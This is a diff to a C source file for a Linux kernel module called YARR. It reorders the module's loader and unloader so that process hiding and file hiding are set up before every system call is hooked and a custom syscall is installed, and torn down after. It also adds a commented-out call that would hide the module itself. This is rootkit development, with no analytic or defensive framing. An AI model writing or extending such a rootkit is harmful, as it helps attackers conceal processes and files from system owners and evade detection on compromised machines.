@@ -160,17 +160,27 @@ int unhook_syscalls(syscallHookingMethods method) {
 static int __init yarr_loader(void) {
 	debug("Loading YARR into kernel...\n");
 
-	// Hook the system calls.
-	hook_syscalls(HOOK_EACH_SYSCALL);
-
-	// Install yarrSyscall().
-	init_syscall();
+	// NOTE FOR DEVELOPERS: Please note that the order of function calls here
+	// is important. Since YARR modifies syscalls if you initialize anything
+	// after hooking the syscalls and that data can be accessed through
+	// syscalls then a process can call a hooked syscall BEFORE your
+	// initialization has occur. For this reason any init_whatever() function
+	// you want to call from here call it BEFORE hook_syscalls().
 
 	// Initialize everything related with hidding processes.
 	init_hideproc();
 
 	// Initialize everything related with hidding files.
 	init_hidefile();
+
+	// Hook the system calls.
+	hook_syscalls(HOOK_EACH_SYSCALL);
+
+	// Install yarrSyscall().
+	init_syscall();
+
+	// Hide yarr.
+//	hideYARR();
 
 	debug("Now sys_call_table is at %p\n", getSyscallTable());
 	return 0;
@@ -182,11 +192,9 @@ static int __init yarr_loader(void) {
 static void __exit yarr_unloader(void) {
 	debug("Unloading YARR from kernel...\n");
 
-	// End hiding files.
-	exit_hidefile();
-
-	// End hiding processes.
-	exit_hideproc();
+	// The same principle explained in yarr_loader() applies here, the freed of
+	// any resource/data we have taken must be done AFTER the freed of the
+	// syscalls.
 
 	// Restore the syscall.
 	if (syscall_taken != -1) {
@@ -196,6 +204,12 @@ static void __exit yarr_unloader(void) {
 
 	// Undo syscall hooks.
 	unhook_syscalls(HOOK_EACH_SYSCALL);
+
+	// End hiding files.
+	exit_hidefile();
+
+	// End hiding processes.
+	exit_hideproc();
 }
 
 // Entry and exit points.
